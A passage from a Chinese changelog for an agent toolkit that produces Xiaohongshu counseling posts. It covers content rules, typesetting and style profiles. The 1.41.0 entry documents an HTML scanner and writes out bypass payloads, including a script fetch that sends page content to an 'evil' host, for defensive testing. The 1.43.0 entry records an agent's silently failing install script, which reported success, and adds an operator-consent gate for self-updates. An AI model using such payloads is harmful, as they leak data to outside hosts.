  于是"主题不在 unsupported、但确实找不到落点"会被读成"可挂"。补 §8.5 第 9 条。
- **`--html-only` 不产 warnings**，§9 会被假绿打勾——已在 §4/§8.1 与脚本输出里点明。
- 文案写作层面：跨篇取证（拿系列上篇的术语当本篇的桥，grep 实测本篇 0 次）、
  方法张冠李戴（本文第四步是果断表达训练，却挂到 SFBT 上）、
  照抄 methods desc 里的结果表述滑向疗效暗示——三条都已在 §8 写成判据。

新增 7 个单测（含违禁词闸门的正反用例），全量 587 passed。
⚠️ `is_accepting=false` 的闸门**未经真实停单场景实测**（当前全部 9 位咨询师都在接单）。

## [1.45.0] — 2026-07-28

### 路线② 补完：系列篇拆分 + 可选的咨询师推介末页

老板两条追加需求：「一个长文可以根据字数拆成好几篇 2000 字左右短文，分上中下，或者一二三四，
系列篇」「末页可以加上咨询师的推介，作为可选项」。

**系列篇**（新增 `scripts/split_longform.py`）：

- **切点永远落在 H2 边界**——字数只用来决定"在哪几个 H2 上切"。章节被劈成两半，读者两篇都读不懂。
- 分组用**动态规划**求全局最优均衡（代价 = Σ(每组字数−均值)²）。贪心不够：同一篇文章拆 3 份，
  贪心分出 1257/821/1227，DP 分出 872/1206/1227。
- 编号：2 篇 = 上/下，3 篇 = 上/中/下，≥4 篇 = 一/二/三/四；标题 `{原标题}（上）`，
  超 20 字硬限会在 `warnings` 里报。
- **承接段/预告段留 TODO 给 agent 写**（那是内容判断，脚本写不了）。参考样本 B 的首句
  「上一篇我们聊到了「无效化环境」」就是这东西——它本来就是一篇系列篇。
  **`typeset_longimage.py` 遇到未填的 TODO 直接报错退出**，硬闸门。
- 首页副信息行自动变成「全文1726字｜阅读需5分钟｜系列 2/2」。
- **`--target` 的字数口径与图上「全文N字」对齐**（含标点）——两处不一致的话，
  按 2000 拆出来的篇，图上会写着 2400 字。
- 长度策略改为**超长优先拆系列、不优先砍**：砍掉的都是查证过的材料，拆系列则读者追更、笔记数量翻倍。

**咨询师推介末页**（`typeset_longimage.py --counselor EMP…`）：

- ⛔ **不用 AI 合成这一页**（与路线① 的做法不同）：路线② 整套图都是排版渲染的，
  末页混一张 AI 图，字体质感色温全对不上，风格必裂。推介卡走同一套排版语言，是同一份 HTML 里的一层。
- 取数与头像**复用 `fetch_counselor.py`**，不另起口径；头像 base64 内嵌。
- 危机声明（含 12356）这一页自带，所以挂了推介末页的笔记危机声明天然在位。
- 默认不放价格（一放整页就从"介绍人"变成"卖服务"）；`--counselor-blurb` 可覆盖官网 introduction。
- **介绍太长会被裁 → 渲染前量高度，放不下直接报错**并提示传 blurb，绝不静默出一张被裁半句话的图。

**视觉返修**（老板反馈"推介图太丑""标题和正文要留更多空间"）：

- 首页标题区呼吸：标题→副信息 34→48px、副信息→正文 46→96px，标题块内边距加大。
- 推介页原本**三种对齐打架**（上半居中 + 简介两端对齐 + 页脚绝对定位贴底），视觉是散的。
  改成整页一张卡：淡色底 + 白卡浮起 + 全局居中，头像 360→300px 加双层描边，加分隔线。
- 危机声明强制单行——原来折行后末尾掉出「务。」这样的孤字。

修掉的真缺陷：专长整行空白（`--emp` 详情里专长在 `profile_sections.specialties` 的
`[{title,desc}]` 里，不是顶层 `specialties` 字符串数组）。新增 30 个单测，全量 577 passed。

## [1.44.0] — 2026-07-28

### 长文拆解第二条路：文本排版长图（老板定案）

老板原话：「博客长文的第二种拆解方式，直接把文本内容精细排版，去掉引用部分，整理成口语化表达，
做成竖版图文笔记发布。小红书主体文本内容，就写引言，简短介绍，SEO 钩子标签。」
依据是他发来的 9 张参考图（两篇实拍笔记、两套皮肤），逐张读过后归一化成规格。

与路线①（信息图轮播）的根本差别：**这条路不过 AI 生图**。AI 渲染不出 2000+ 字无错字的正文排版——
路线② 的图是**确定性排版渲染**产物，每个字都来自输入文件，不存在图内错别字与风格漂移。

- 新增 `nbdpsy-xiaohongshu-creator/scripts/typeset_longimage.py`：
  markdown → HTML/CSS → Chromium → **按行边界切页** → 1440×2400 PNG。
  两套主题：`clean`（白底红黑黑体，适合有表格/分级清单）、`paper`（淡蓝纸纹衬线，适合叙事疗愈向）。
  分页三条硬保证：**正文允许跨页断句**（参考样本就是这样）但**绝不半行横切**；
  **标题不孤行**（要么整体进下一页，要么至少带一行正文）；**表格不腰斩**。
  没装 playwright 时 `--html-only` 降级出 HTML，并给人话安装指引。
- 新增 `references/longform-typeset-spec.md`：路线判据 + 文本改造四道工序 + 输入契约 +
  两套主题 + 正文写法（120–200 字，与路线① 的 300 字三段式不同）+ **与既有规格的适用性对照表** + 验收清单。
  - **去引用的边界写死**：删的是编号引用 `[[n]](url)`、参考文献节、裸链接；
    **行内作者年份（`Linehan（1993）`）必须保留**——参考样本逐张核过全都在。
    把出处一起删掉 = 一堆没出处的心理学断言，撞铁律 1。
  - 长度控制：实测 **≈370 字/页**，目标区间 1500–3500 字；>5000 字不许整篇搬。
- `SKILL.md` 新增**第 0.6 步 · 选拆解路线**（每批必做，判错整批返工）+ 留痕行
  `拆解路线：② 文本排版长图`；第 1、3 步对路线② 标注跳过，第 2、6 步给出路线② 分支。
- **审查端同步**（不改的话路线② 会被 100% 假 FAIL）：`checklist-note.md` /
  `checklist-images.md` 各加一节**开审前先认路线**——路线② 豁免密度五字段、页数 6–9、
  正文 210–450 三项，改判七条长图专属项；**合规扫描/危机声明/红线三层一条不减**，
  且因为图里是整篇长文，`check_compliance.py` 必须**对 `body.md` 本身也跑一遍**。

⚠️ 老板说的是「16:9 竖版」，但 9 张参考样本实测全是 **1440×2400（3:5）**——按实测落地。

## [1.43.0] — 2026-07-28

### `nbdpsy_common.py update` 自更新子命令（agent 代跑，但**必须先得运营点头**）

起因（同事 macOS 机器实况）：`curl | bash` 与克隆后 `bash ./install.sh` 都跑不动，
该机器的 agent 于是**通读安装器后手写等效脚本**——踩了 zsh 坑：
`SKILLS="a b c"; for s in $SKILLS`，**zsh 不做无引号变量分词**，7 个名字被当成一个路径，
**一个 skill 都没复制、循环里的 ✓ 照常打满屏**（静默失败还汇报成功），同循环的 `rm -rf`
拿着同一个畸形路径删东西、**只是侥幸目标不存在**。

- 新增 `update` 子命令：从官方仓库取最新版覆盖两个 skills 目录。纯 Python、跨系统一致（无 zsh/bash 差异）；
  **skill 清单从源仓库派生**（`nbdpsy-*/SKILL.md` 存在即算）而非硬编码，防与 install.sh 数组漂移；
  **每复制完一个 skill 都校验 `SKILL.md` 真的落地，失败立即报错退出**——绝不在失败路径打 ✓
  （把上面那次事故的教训固化成代码）；顺带写 v1.42.0 那份版本标记；`--source` 支持本地仓库。
- guide 重写「更新工具包」：① `COMMON update`（agent 代跑，绝大多数情况到此为止）→
  ② 运营在自己终端跑 → ③ 会话里 `!` 前缀。**禁止手写等效安装脚本**（带上面事故的三条拆解；
  万不得已手搓也必须 `bash` + 数组 + 逐项断言 `SKILL.md` 存在）。

**⚠️ 一道有意加的闸：跑之前必须运营明确同意。**
skill 目录里的 `SKILL.md` **就是 agent 之后办事的指令**——更新 = 从网上拉一份新的覆盖掉它，
**拉来的内容会直接变成 agent 的行为方式，中间没有任何人看过**。所以这不是 agent 可以自作主张的
日常维护动作：guide 里给了一句不带术语的问法（「要把工具包更到最新版吗？会覆盖 7 个技能文件，
你的密钥和风格档案不动」），运营点头才跑。
**例外**：运营自己开口说「更新工具包 / 升级 / 装最新版」——那本身就是同意，直接跑、别再追问一遍。

> 这道闸挡的是「仓库万一被推了坏东西，所有装了工具包的机器上 agent 自动照做」——
> 概率低但代价是全员一起出问题，而问一句的成本几乎为零。
> 运营是非技术兼职人员，**不该被要求开终端敲命令**，所以闸门做成"点个头"而不是"自己动手"。

---

## [1.42.0] — 2026-07-28

### 安装落盘版本标记，doctor 上报工具包版本

老板点破的缺口：装完 skill 本机**没有任何版本痕迹**——`install.sh` 只拷 7 个 skill 目录，
版本号住在仓库根 `.claude-plugin/plugin.json`，从来没被拷过去。后果：想知道本机哪版只能靠
mtime + 对 master diff 猜；同事机器落后 10 个版本没人发现（自检只说"已装过→跳过"）。

- 两个安装器（`install.sh` / `install.ps1`）在每个安装目的地写
  **`.nbdpsy-skills-install.json`**（version / commit 短哈希 / installed_at / source
  是本地仓库还是 curl 克隆）。无 jq 依赖；提不到值写 `unknown`、写盘失败只提示一行，
  **绝不让 skill 安装因此失败**。PS 侧显式写 UTF-8 无 BOM（PS 5.1 的 `-Encoding UTF8`
  会带 BOM，`json.load` 直接炸）。
- `doctor` 新增「工具包版本」一行：`工具包 v1.42.0（{commit}，装于 {日期}）`。
  **标记缺失 = info 不 = fail**——存量机器全都没有这个文件，判 fail 会让所有人的 doctor
  一夜变红；提示"重跑一次 install.sh 即可补上"（覆盖式、秒级、不动凭据）。
- doctor **不联网比对最新版**（保持本地自检语义），"是否落后"归 guide 更新流程；
  `installed_at` **只当字符串展示、不 parse**——bash `date -Iseconds` 与 PowerShell
  `Get-Date -Format o` 格式不同，一 parse 就会被其中一种咬（实测七位小数秒也能正常展示）。
- 坏标记（空文件 / 坏 JSON / 缺键）一律静默跳过按"缺失"处理，doctor 不崩。

---

## [1.41.0] — 2026-07-26

### 新增：战略规划报告一键搬运（`tools/publish_strategy_report.py`）

管理后台「战略规划」模块（`/strategy`）本次开了 API Key 入口，运营出完的 HTML 报告不必再手工贴进后台。
新脚本按 slug 幂等 upsert：

```
python3 tools/publish_strategy_report.py --html 报告-artifact版.html \
    --slug ops-diagnosis-202607 --title "运营数据诊断报告（2026-07）" \
    --generated-at 2026-07-26T12:17:00+08:00 [--version-label v1-首发] [--update] [--dry-run]
```

`--update` **必须同时给 `--version-label`**，否则客户端直接拒绝、一个字节都不发：后端 upsert 是
`ON CONFLICT DO UPDATE SET version_label = EXCLUDED.version_label`，漏传会把库里已有的标签静默清成
`NULL`（前端 3 处退化成显示 slug，批注导出抬头也从「报告版本：v1-首发」变成 slug），而脚本只会回显
`null` 不告警。后端行为不动，闸门放在客户端。

它落在 `tools/` 而不是任何一个内容 skill——这是运维工具，不是内容生产工具。

**写前拒绝**：脚本**总是**带 `expect`（无 `--update` → `new`，有 `--update` → `revision`），
与实际不符时服务端返 409 且**不写库**，所以不存在「覆盖已经发生、回不去」这回事；
脚本把两个方向分别说清（slug 已存在 → 建议 `--update` 或换 slug；slug 不存在 → slug 大概写错了，
新建应去掉 `--update`）。若 200 却返回与 `expect` 相反的 `created`，视为契约破裂而非成功，非零退出。

**发请求前的本地预检**（任一不过直接退出，一个字节都不发）：
- **不是完整 HTML 文档**——同一产出目录里常同时躺着 `报告-artifact版.html`（片段）与 `报告.html`（完整文档），
  同名前缀、字节数只差两百多，`--html` 指错是高概率事故。`<head>` 按**带闭合尖括号**精确匹配
  （片段里有合法的 `<header>`，前缀匹配会误伤），且**不拿 `<title>` 当判据**（两个版本各有一个，区分不了）。
- **无外部资源引用**。理由不是「外链加载不了会缺图」，而是反过来——外链会真的加载，等于给一份在
  管理后台里渲染的文档开了一条出站通道。判据**不是属性名枚举**（枚举漏 `srcset` / `imagesrcset` /
  `<object data>` / `<video poster>` / `<form action>` / `<base href>` / `<meta http-equiv=refresh>` /
  `<script>fetch()`，后者能把报告正文直接外带），而是**按位置划线**：只扫「浏览器会拿去取资源的位置」——
  **每个标签的属性值**与 **`<style>` / `<script>` 块的内容**，其中任何 `https?://` 或协议相对 `//`
  开头的 URL 命中即拒。相应地，这些位置之外一律放行：
  - **标签之间的文本节点**：`<p>数据来源：https://…</p>`、`<pre><code>curl https://…</code></pre>`。
    「参考资料 / 数据来源」章节把网址当正文列出来是运营报告最常见的写法（LLM 出稿尤其爱写），
    渲染时不发任何请求，拦它是纯误杀。
  - **`<a href>` 超链接**（唯一被跳过的属性）：点击才导航，且后台那个 iframe 是
    `sandbox="allow-scripts"`，没有 `allow-popups` / `allow-top-navigation`，点了也出不去。
    `<a>` 上的其它属性（`ping`、`style="…url(…)"`）照旧参与判定。
  - **HTML 注释**：`<!-- 生成自 https://… -->` 不渲染。
  - **命名空间 URI 白名单**：`.../2000/svg`、`.../1999/xlink`（Illustrator 与多数图表库导出的老式 SVG 带它）、
    `.../1999/xhtml`（`<foreignObject>`）。白名单按**整串精确匹配**（或其后紧跟 `#` 片段），不是前缀匹配——
    前缀匹配会被 `http://www.w3.org/2000/svg.evil.com/x.png` 这类同前缀域名当成出站通道。
  - 页内锚点 `#s1`、相对路径 `/x`、`data:` URI（含以 `//` 开头的 JPEG base64）继续放行。

  **分词交给标准库 `html.parser.HTMLParser`，不用正则近似**。用 `<[^>]+>` 这类正则切标签，
  在三处必然出错，其中两处是 fail-open（静默放行出站外链）：
  1. **引号属性值里的 `>` 会让正则断句**——`<img alt="收入>成本" src="https://cdn.evil.com/x.png">`
     在第一个 `>` 处被切断，`src` 连同标签后半截掉进「标签之间」完全不被扫描；而浏览器按 HTML5 分词
     把引号内的 `>` 当普通字符，整条 `img` 正常解析并**真的去取图**。运营数据报告里
     `alt="留存 > 60%"`、`title="收入>成本"` 是完全正常的写法，踩中它不需要恶意。
  2. **注释终止符不止 `-->`**——浏览器在 comment-end-bang 状态遇 `--!>` 即结束注释，
     `<!-- 说明 --!><img src="https://…">` 里的 `img` 正常渲染并发起请求；而 `<!--.*?-->`
     会从第一个 `<!--` 一路吃到最后一个 `-->`，把整条 `img` 吞掉。
  3. **正文里的裸 `<` 会制造假阳**——`<p>转化率 < 5%，数据来源：https://…</p>` 里的 `<` 让后面的
     正文被当成「标签内部」，一个纯文本网址被误杀。比较符在运营数据报告里很常见，LLM 出稿也常不转义成 `&lt;`。

  `HTMLParser` 一次解决前三条：属性由它解析成键值对（引号里的 `>` 天然不断句），
  裸 `<` 被当文本。**顺带闭掉 HTML 字符引用绕过**——`<img src="&#104;ttps://evil.com/x.png">`
  浏览器解码后照样发请求，而解析器交出的属性值已是解码后的真值，判据直接跑在真值上。
  它对畸形 HTML 的容错与浏览器不完全一致，但输入是我们自己生成的报告，且严格比正则更接近浏览器；
  **解析抛异常一律 fail-closed**（当作预检不过，绝不因为「解析器炸了」就放行）。

  **但有两处必须自己补齐，不能全指望 stdlib**——都由真实 Chromium（按后台的
  `iframe sandbox="allow-scripts"` + `srcdoc` 渲染、route 拦截统计实发请求）逐条复现确认：

  - **`<script/>` / `<style/>` 伪自闭写法**（覆写 `handle_startendtag`）。HTML5 规定
    **HTML 元素上的自闭合标志被忽略**，浏览器照常让 script/style 进 raw-text 一路吃到
    `</script>` / `</style>` 并执行整块内容；`HTMLParser` 相反——见到 `/>` 走
    `handle_startendtag`（默认实现＝`handle_starttag` + `handle_endtag`），raw-text 标志
    刚置上就被同一次调用清掉、解析器自身也没进 raw-text，于是
    `<script/>fetch("https://evil/leak?d="+document.body.innerHTML)</script>` 整块 JS
    以普通文本（甚至被当成 HTML 注释）漂过去而**完全不被扫描**——浏览器实发请求，闸门判空。
    修法：对 `style` / `script` 的 `/>` 当作**普通开始标签**处理（属性照常收集，并显式
    `set_cdata_mode` 让解析器真正进 raw-text），收尾交给结束标签；其余元素的 `/>`
    维持自闭合语义。`<script />`（带空格）、`<SCRIPT/>`（大小写）、`<style media="all"/>`（带属性）、
    块内含 JS 注释或裸 `<` 的变体一并覆盖。
  - **`--!>` 的判据不许挂在解释器补丁级别上**（`_normalize_for_scan`）。`HTMLParser` 认不认
    `--!>` 取决于装机环境：打过 HTML5 对齐补丁的构建是 `commentclose = r'--!?>'`（认），
    历史 stdlib 是 `r'--\s*>'`（**不认**，上面第 2 条的缺陷原样复活）。`install.sh` 声明支持
    Python 3.9+，运营在自己机器上装完洞就悄悄回来、工具还一声不吭。故**扫描前把 `--!>`
    归一成 `-->`**——只改扫描用的副本，上传的 `content_html` 仍是原始字节。归一化是安全的：
    注释之外这两个记号都只是普通字符，换的是一种等价的注释终止符，既不新开注释也不改变 URL 匹配。
    回归用例把 `html.parser.commentclose` 分别按住成历史版与对齐版，**两档都必须命中**，
    因而不依赖本机 stdlib 的实际行为。

  与之同源的一条纪律：`CDATA_ELEMENTS` 是 `HTMLParser.CDATA_CONTENT_ELEMENTS` 的
  **故意收窄的自有副本**，只取 `style` / `script`。不直接引用 stdlib 常量，是因为它随版本漂移
  （3.12 已扩到 6 个，含 `xmp` / `iframe` / `noembed` / `noframes`），判据跟着 Python 版本变
  意味着同一份报告在不同机器上结论不同。只取这两个则是按「浏览器会不会拿这段文本去取资源」划的线：
  `<iframe>` 出站靠的是 `src` **属性**（属性值本就逐条扫），`xmp` / `noembed` / `noframes`
  的文本只当纯文本渲染——实测浏览器零请求、闸门也放行，两边一致。
  往这个元组里加元素时**必须同步处理 `handle_startendtag` 的状态**，否则就是又一条静默出站通道。

  **两处刻意保留的误杀**（方向都是 fail-closed，且报错直接指到位置，作者删掉即可）：
  - `<style>` / `<script>` 块是**整段内容**参与扫描，因此块内**注释里**的网址
    （`// 算法见 https://…`、`/* 配色参考 https://… */`）**会被拦**。不做注释剥离，是因为要剥离就得在正则里
    近似 JS/CSS 分词，而 `url(https://…)` 里的 `//`、字符串字面量里的 `//` 都会把朴素的行注释规则带沟里——
    这正是上面三条的成因。
  - **`<svg>` 里嵌的 `<script/>`** 会被拦，尽管浏览器实测零请求——自闭合标志在**外来元素**
    （foreign content）上按 HTML5 是**生效**的，script 真的自闭了。要精确区分就得自己维护
    svg / math 元素栈，判错方向就是 fail-open，不值当。
    （注意同位置的 `<svg><style/>…` 实测**照样出站**，那是真缺陷、不是误杀。）

  **报错文案指到命中位置**（`<img src> → https://…`、`<style> 块内容 → https://…`），
  并说清「正文文本 / HTML 注释 / `<a href>` 里的网址不必处理」，免得作者拿着一句「含外部资源引用」
  满篇找 `<img>` 只能靠猜。
- **不检查主题**。报告是双主题文档，靠后台 srcdoc 前置注入 `data-theme="light"` 稳定渲染；
  静态 grep 判不了「实际渲染成什么色」，加了只会误杀合格产物。

**输出纪律**：**除命令行用法错误（argparse，exit=2）外，每条路径都往 stdout 打一行 JSON 且必带
`outcome`**（`created` / `updated` / `conflict` / `failed` / `dry-run`），字段为
`slug`/`id`/`created`/`version_label`/`bytes`（失败再加 `reason`）。文件不存在、为空、非 UTF-8、
**权限不足读不了**都走 `preflight_failed` 这一条，不抛裸 traceback——否则 stdout 一个字都没有，
调用方无从解析。stderr 只给人看。`--dry-run` 只打字段摘要，不打正文全文，且**全程不使用密钥**
（运营等管理员发密钥期间就该能本地自查 `--html` 有没有指错）；任何日志、报错、异常里都不出现密钥或
其片段，请求失败只回显状态码与服务端 `error` 文案（403 另附「去哪儿补权限」的可行动指引，见下）。
`--generated-at` 设为**必填**——省了的话页头
「生成于」显示的是推送时间而不是出数时间，同一份内容重发时间还会漂。

**凭据只用一把：战略报告复用发文 key，无需单配。** 运营侧要配的仍然只有
`NBDPSY_BLOG_API_KEY` 一行——脚本按 `NBDPSY_STRATEGY_API_KEY or NBDPSY_BLOG_API_KEY` 取值，
`doctor` 的 `strategy_ready` 同口径（两者其一存在即就绪），且**不进 `REQUIRED_KEYS`**、
不判整体失败。

**权限由后台勾选，不由凭据数量区分。** 服务端 `blog_api_keys.scopes` 是 JSONB 数组，一把 key
天然可同时持有 `["blog:write","strategy:write"]`，并逐 scope **fail-closed** 校验——隔离在
scope 层就已经完成，物理上分两把 key 只是签发时的选择，不构成额外隔离。所以回退**不降级安全**：
拿一把只有 `blog:write` 的 key 去调战略端点，会被服务端 403 拦住，不会静默越权。
`NBDPSY_STRATEGY_API_KEY` 保留为**显式覆盖**（真需要一把能独立吊销的战略专用 key 时单配它即优先生效）。

配套两处文案不谎报、可行动：`doctor` 就绪那条 note 明说「能不能发由服务端按 scope 判定，
这把 key 若没勾 `strategy:write` 会在发布时被 403 拒绝」；脚本遇 **403 不再只回显服务端原文**，
直接给出「请管理员在管理后台 → 博客 → API Keys 页给这把 key 补勾 `strategy:write`，或重新签发
一把含 `blog:write` + `strategy:write` 的 key，补好后原样重跑」。缺凭据的 `MISSING:` 提示也改为
「两把都没有」的口径，指向发文凭据配置包。

## [1.40.0] — 2026-07-27

### 推介笔记：发布标题三要素 + 内页密度提升

老板口径：「推介笔记我就感觉信息密度太低了。**标题要出现咨询师的名字，以及他的能力、来访画像**。
标题和文本内容可以参考 NBDpsy 主号的笔记：心理咨询师-李宇，陪你整合创伤与秩序」。

此前 `counselor-note-spec.md` **根本没有「发布标题」的规格**（只有封面图文字），agent 凭感觉写。
新增 §1「发布标题」：结构定死 **`心理咨询师-{姓名}，{陪你/带你＋能力动词短语（嵌来访画像困扰词）}`**，
三要素缺一不可、≤20 字（李宇篇 18 字是满格示范）、能力短语须在 `fetch_counselor.py --emp` 有出处。

**站内数据支撑**（2026-07-27 从主号拉的，已连同混杂因素写进 spec）：
李宇（04-29，三要素齐）**1982 views / 12 粉** vs 赵野（04-28，纯名字）**187 / 0**——
同号、前后一天、10 倍差距；带「陪你+能力短语」的两篇（李宇/胡琬琰 1698）显著高于纯名字
（赵野/李冠阳 677/于施文 454）；**抽象理念短语**（徐瑞恒「从理解出发」407 / 刘琼「重构自我」380）
**不如具体困扰词**（创伤/身体感受）——来访会搜、会对号入座的是困扰词，不是同行觉得美的词。
反例三类都进了审查判据：纯名字 = FAIL、抽象理念 = major、硬蹭 = FAIL。

**与科普标题规则双向隔离**（防新旧规则打架）：科普的「目标长尾词前 10 字」对推介**不适用**——
推介前 10 字天然是「心理咨询师-姓名」，那是**人名搜索**的入口，本身就对；自检不传 `--title-keyword`。
两端（创作/审查）都写死了适用范围，判据 5「钩子首句」对推介同样停用（推介开头强制人物直入）。
⛔ 旧口径「姓名＋最硬资质」作废——「李宇｜北大心理硕士」形态缺能力与画像，会被判 FAIL。

**内页密度**（老板嫌太低的直接回应）：
- 封面 P1 副题扩**两行**（职称 + 能力/画像钩子 ≤14 字，与发布标题同源），图审端已接住这条判据；
- P3 风格卡补硬指标 **6–10 信息点 + 图文双通道**（此前只有 P2 有 8–10 点）；
- 末页从「怎么预约」扩为**预约流程 + 适合谁找他**（画像 3–4 条「如果你正在…」句式）——最空的一页变画像页；
- 配比改「**素材够就 5–6 页，4 页是下限不是默认**」（第 5 页 = 擅长议题展开页）；
- 正文开头须与发布标题**同源展开**，禁两张皮。

---

## [1.39.0] — 2026-07-27

### 每用户风格档案：视觉调性不再是全站写死的常量

老板口径：现在的莫兰迪三色 + 短发圆领毛衣女生「这就是**管理员的**风格调性」，
每个运营都该能有自己的一套，**完全自主**（可与现有品牌视觉完全不同，适配多号矩阵）。

- 新增 `nbdpsy-xiaohongshu-creator/scripts/style_profile.py`，对接 server 的 6 个端点
  （读 / 存新版本 / 列历史 / 取某版 / 回退 / 更新默认配置），23→34 条回归测试。
- **四个入口**：安装引导（`secret import` 后紧接着 `--get`）、对话中更新、样本卡固化、版本回退。
- **v1.38.0 的「品牌资产保留」语义反转**为「**当前用户的风格档案保留**」；样本卡的
  「⛔ 记录但不采用」区改为「**⚠️ 待定：是否更新进风格档案**」，由运营拍板——
  选「更新」就走 `PUT` 存新版本，此后他本人所有笔记都用新配色/新人物。
- **审查端不再拿写死的 HEX 判**（否则自带调性的运营会被整批判 FAIL），改为对该批次
  留痕行指定的那一版 `profile.visual/tone/density` 判。

**三条硬约束**（server 与老板都点名，逐字落进脚本与文档）：
① `GET` 先看 `exists`——`true` 是他自己的档案、`false` 是还没有，**两句话不能说错**
（说错会让运营以为默认配置已经是他的了）；② `PUT` 是**整份覆盖不是打补丁**，改一个字段也要
先 `GET` 拿全量再整份发；③ 收到 **409 别重试同一份 body**。

**两条主会话补的设计**：
- **三层降级**：自己的档案 > 默认配置 > **skill 内置兜底**。第三层是刚需——
  `NBDPSY_XHS_API_KEY` 是可选凭据，没配的运营照样要能做内容；但**不许静默降级**，必须说出口。
- **批次留痕**：`00-overview.md` 记下用的是哪一版（`风格档案：v{N}（本人档案 / 默认配置 /
  内置兜底，读取于 {日期}）`），审查端**按留痕行指定的版本判、不按当前最新版**——
  否则档案更新到 v8 之后复审 v3 时做的图，判出来的 FAIL 全是假的。

### 术语：默认配置 / 运营老大 / 一般用户

起因：后台里写「管理员」会跟**后台系统管理员**（登录 NBDpsy 管理后台的人）混淆，那是两回事。

`role=admin` → **运营老大**；`role=operator` → **一般用户**；
没有个人风格档案时跟随的那一份 → **默认配置**（不再叫「管理员默认档案」）。

默认配置按**方案 A**：一份独立配置，不等于任何人的个人档案；任何运营老大都能改；
**没有个人档案的人实时跟随**（不只影响之后新建的）；**运营老大改自己的风格 ≠ 改默认配置**，
两份分开存，要让新人也用上得再显式更新一次。后两条在 guide 里写死了——按下去之前得知道波及面。

⚠️ **向后兼容**：本次之前的批次留痕行写的是「管理员默认」，两份 checklist 各写死一句
「等同于默认配置、照常识别、**不得判成格式错误**」——不写这句，存量批次一复审全被判格式错。

### 笔记数据口径：更正两处我们自己写错的

- **`unknown` 写多了 7 个**：照的是第一轮抄表的旧快照。实际只有 `reposts` 是 `unknown`——
  `likes`/`comments`/`collects`/`shares`/`danmu` 是 `T`，`follows`/`avg_view_duration` 是 `T-1`。
  这 7 个字段的"口径未知"免责声明撤掉。
  ⚠️ **`reposts` 单独写死**：恒为 0 **不是"没人转载"，是导出表压根没这列**——
  agent 看到 0 会写出"转载为零说明内容不值得转"，**不可用于任何分析与结论**。
- **`engage_rate` 跨窗的推测被证伪**：四项同为实时 `T`、口径一致、安全。
- **`follow_rate_t1`**（同窗涨粉率）：null 含义、轻微偏高的成因与量级、快照断档会放大、
  新接入账号取不到。`follow_rate` 两条运营话术逐字落地——尤其**「发布当天不是偏低是无意义，
  别解读成涨粉能力差」**（`follows` 是 T-1 还没覆盖发布日，值必然趋近 0）。
- **`/notes` 的 `field_meta` 声明了它不下发的字段**：六个派生率只在 `/note-trends` 有。
- ⛔ **`/notes` 的 `notes[]` 是入库顺序、不是按任何指标排的**（server 2026-07-27 核实并修正了
  此前 meta 里"按最新 views 降序"的错误说明）。**要找"哪几篇最高"必须自己排序**——
  直接取 `notes[:5]` 当 Top5 拿到的是**最早入库的 5 篇**，不报错、结论却是错的
  （实测真正的 Top1 排在第 4 位）。

### 防数据丢失：`dropped_keys` 与留底

- **`dropped_keys`**（server 侧实现，比我们自己比对可靠——他们手上有上一版）：
  `PUT`/`rollback` 后必须读，非空时**当场回读给运营确认**。
  实测形态：agent 想改配色，只发了 `{visual:{palette}, density:{五字段}}` →
  `text_color`/`character_card`/`tone.*` 全被清空、**静默 200**。固化场景是高发点。
  救回路径写明：值要从 `--version <上一版>` 取，**光重新 `--get` 救不回来**（覆盖已生效）。
- **`--get-default`**：改默认配置前留底。⛔ 仍禁止拿 `--get` 当留底手段——
  它读的是**调用者自己的档案**，建过个人档案的人拿到的根本不是默认配置，且照样 exit 0 不报错。

---

## [1.38.0] — 2026-07-26

### 参考样本模仿：运营发参考图文，我们模仿着做

老板口径：「生成小红书内容时，需要支持运营发一张参考的图文，然后模仿着做（图片风格、信息密度、说话语气等）」
＋「或者发好几张图文，拆解复刻」＋「参考图可能是多张图，很有可能是完整的一个小红书笔记，封面、内容、结尾都有」。

新增 `nbdpsy-xiaohongshu-creator/references/reference-mimicry-spec.md` 与 SKILL.md **第 0.5 步「吸收参考样本」**。

**两个已拍板的取舍**：
- **品牌资产保留，模仿其余**——莫兰迪三色与固定人物卡**不动**；版式结构、信息密度、图文比例、笔触质感、说话语气**照模仿**。
  参考样本的配色/人物形象记进样本卡的「⛔ 记录但不采用」区（那是**记录**，不是待办清单）。
- **参考图违反红线时「运营给了就照做」**，但只限**产品判断级**（术语做落点、自测句式、恐惧钩子、P4、密度/emoji/引号/标题结构）。
  **法律/执业级**（F1 疗法对比与用药建议、G5 案例可反向识别）与**平台封号级**（站外导流）⛔ **不可覆盖**。
  覆盖必须在 `00-overview.md` 留痕，审查端**只对被点名的条款不判 FAIL**。

**三种输入形态**（先判形态再提取，判错了规格全废）：A 整篇多页（最常见）／B 多篇单页／C 多篇多页。
形态 A/C 按**页角色分别拆解**（封面卡 / 内容页卡 / 末页卡 / 整套编排）——
⚠️ **密度实测绝不可把封面的 15 字与内容页的 300 字平均**；**只有「内容页卡」的密度进密度五字段**，
封面/末页文字量单独记录（与 v1.37.0「密度只约束内容页 P2…P(N-1)」天然对齐）。
单张样本一律按形态 B 处理，置信度全部为 `低`，密度沿用默认档。

**优先级链**：运营口头指令 > 样本卡实测 > skill 默认。运营既给图又开口时，样本卡 ④ **保留实测值**、
口头值只进 `00-overview.md`，`运营原话` 用合成格式保住「归一化与原话不符 = FAIL」的复核能力。

**参考图不当 anchor**：先用样本卡做出我们自己的 P1（配色人物是品牌资产）→ 运营确认 → **P1 才成为批次锚点**。
直接拿参考图当 anchor 会把对方的内容特征传染到每一页，且配色会盖掉品牌基底。
成图里出现参考样本的配色/人物形象 = FAIL，报告须区分是「误把参考图当 anchor」还是「把不采用区当成了要采用的」。

**版权护栏**：模仿风格 ≠ 抄文案，参考样本的句子一句原文都不许照搬；样本卡只记结构特征、**不摘录原句**
（摘了下游 agent 就会顺手抄进去）；参考样本里的统计结论不得采用，事实仍须溯源到我们自己的源长文。

### 长文引用职责分离：写作只写简称标记，专职引用步统一编号补链接

老板口径：「长文写作里关于引用的部分还是有问题……应该有一个单独的 agent 负责引用。写作时文内用括号写引用简称，
比如谁谁谁在几几年什么文章，然后负责引用的 agent 在流程到他时把这些引用加上跳转链接。」

**问题**：原流程要求写作时就写终态 `[[n]](url)`，n 对应文末序号、URL 还要与 `citations` 逐字一致（`CITE-MATCH` 机检）——
写作 agent 同扛「组织语言 + 维护编号 + 抄准 URL」，中途增删一条文献后面全漂移，为了不返工就少引，最后又被 ≥6 条的硬闸卡住。

**改法**：写作态只写 `【引: 作者/机构 年份, 文献简称】`（用 `【引: ` 前缀是因为正文本就有大量正常全角括号，
